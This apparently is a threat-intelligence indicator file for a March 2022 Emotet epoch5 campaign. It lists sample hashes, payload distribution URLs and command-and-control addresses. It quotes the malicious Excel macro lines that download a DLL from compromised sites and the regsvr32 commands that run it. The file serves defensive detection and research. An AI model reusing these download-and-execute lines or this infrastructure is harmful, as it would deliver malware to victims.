@@ -1,0 +1,109 @@
+Emotet 2022 | epoch5 | 10.03.2022 | 
+
+************************************************************************************************************
+
+.xls e5ebbd764a9304854343b9ef7cec5b00d87c3468bacc34cdbe758468c9f4a81b
+.dll a33588137300a5e6715aa55173de86f410617d2cecf4af81c19c111a0eeba8c4
+
+.xls e5ebbd764a9304854343b9ef7cec5b00d87c3468bacc34cdbe758468c9f4a81b
+.dll a33588137300a5e6715aa55173de86f410617d2cecf4af81c19c111a0eeba8c4
+
+************************************************************************************************************
+
+Exec >>
+
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://www.agretto.com/Template/ziasuz5w8pS08Gm2/", "..\wn.ocx")
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\detalles_1003.xlsm
+
+regsvr32.exe -s ..\wn.ocx
+
+regsvr32.exe /s "C:\Windows\SysWOW64\Ozbfk\dhjdztut.imw
+
+************************************************************************************************************
+
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://www.ajaxmatters.com/c7g8t/kYHGlphIEPNOImddm1/", "..\wn.ocx")
+
+EXCEL.EXE" /dde C:\Users\Admin\AppData\Local\Temp\DOCUMENTO-10032022.zls.xlsm
+
+regsvr32.exe -s ..\wn.ocx
+
+regsvr32.exe /s "C:\Windows\SysWOW64\Mwuqhlfbzvulrqv\bntelpwh.ubi"
+
+
+************************************************************************************************************
+
+.dll distro
+
+
+http://www.ajaxmatters.com/c7g8t/kYHGlphIEPNOImddm1/
+http://185.210.144.149/app/1BKfC3id6jsiH0MC/
+http://45.76.178.115/sample_sticker/tihOPhaF1l0V/
+http://academicinst.com/wp-includes/44ZVeVQBkeOG/
+http://henrysfreshroast.com/0Rq5zobAZB/
+http://13cuero.com/wp-admin/ff5srrfTNsCju6sD3/
+http://abinsk.com/cgi-bin/fm63rXkG5Y/
+
+http://www.agretto.com/Template/ziasuz5w8pS08Gm2/
+https://lifebotl.com/Response/WllkQWM/
+http://185.187.70.35/wordpress_bo/srvoaI2MBFc/
+http://103.85.95.5/v1/uploads/87DtpAEZULSccOn/
+http://www.agnesleung.com/raw.backup/j4ry/
+https://livejagat.com/h/SjpRvD/
+http://188.166.245.112/sipadu/eFi8UiJETZiK1FB/
+
+Network
+
+https://186.250.48.5:80/GphfELTBPADwiAfDEtWnVgzLTToR
+https://168.119.39.118/GhtWaAErbXlAeblhMriaDuAGmWMtjnNxvWXKLLSGDGrFGKiyCeFZZIZQcgaTvE
+
+https://186.250.48.5:80/doXNNYfrbxCRLrjCTpvNDuqwxLcaJpJTfqCrCnhbhbvCTJ
+https://168.119.39.118/JSRUWClyXOOdUOlAfgJVCPMcrzs
+
+c2's
+
+51.75.33.122:443
+186.250.48.5:80
+168.119.39.118:443
+207.148.81.119:8080
+194.9.172.107:8080
+139.196.72.155:8080
+78.47.204.80:443
+159.69.237.188:443
+45.71.195.104:8080
+54.37.106.167:8080
+185.168.130.138:443
+37.44.244.177:8080
+185.184.25.78:8080
+185.148.168.15:8080
+128.199.192.135:8080
+37.59.209.141:8080
+103.41.204.169:8080
+185.148.168.220:8080
+103.42.58.120:7080
+78.46.73.125:443
+68.183.93.250:443
+190.90.233.66:443
+5.56.132.177:8080
+62.171.178.147:8080
+196.44.98.190:8080
+168.197.250.14:80
+66.42.57.149:443
+59.148.253.194:443
+104.131.62.48:8080
+191.252.103.16:80
+54.37.228.122:443
+88.217.172.165:8080
+195.77.239.39:8080
+116.124.128.206:8080
+93.104.209.107:8080
+118.98.72.86:443
+217.182.143.207:443
+87.106.97.83:7080
+210.57.209.142:8080
+54.38.242.185:443
+195.154.146.35:443
+203.153.216.46:443
+198.199.98.78:8080
+85.214.67.203:8080
+
